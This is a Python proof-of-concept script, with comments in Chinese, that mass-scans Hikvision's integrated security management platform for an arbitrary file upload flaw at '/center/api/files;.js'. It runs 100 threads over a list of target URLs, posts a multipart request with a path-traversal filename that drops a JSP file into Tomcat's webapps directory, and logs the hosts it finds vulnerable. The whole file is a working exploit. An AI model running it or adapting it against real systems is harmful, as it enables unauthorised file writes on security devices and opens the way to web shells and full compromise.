import argparse
import requests
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    king = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:海康威视 综合安防管理平台软件 files;.js 任意文件上传漏洞 
                                        version:1.0 author:YeahSir               
"""
    print(king)


def main():
    banner()
    # 设置参数
    parser = argparse.ArgumentParser(description="海康威视 综合安防管理平台软件 files;.js 任意文件上传漏洞")
    parser.add_argument('-f', '--file', dest='file', type=str, required=True, help='input file path')
    args = parser.parse_args()

    # 处理资产，添加线程
    url_list = []
    with open(args.file, 'r', encoding='utf-8') as fp:
        for i in fp.readlines():
            url_list.append(i.strip().replace('\n', ''))
    mp = Pool(100)
    mp.map(poc, url_list)
    mp.close()
    mp.join()


def poc(target):
    url_payload = '/center/api/files;.js'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
        "Cache-Control": "no-cache",
        "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    data = "--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"11223344\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"

    try:
        response = requests.post(url=url, headers=headers, data=data, timeout=5)
        result = target + '/clusterMgr/test.jsp;.js'
        if response.status_code == 200 and "filename" in response.text:
            print(f"{GREEN}[+] {target} 存在文件上传漏洞！\n[+] 访问：{result} \n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] {target} 不存在漏洞！！")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")

if __name__ == '__main__':
    main()
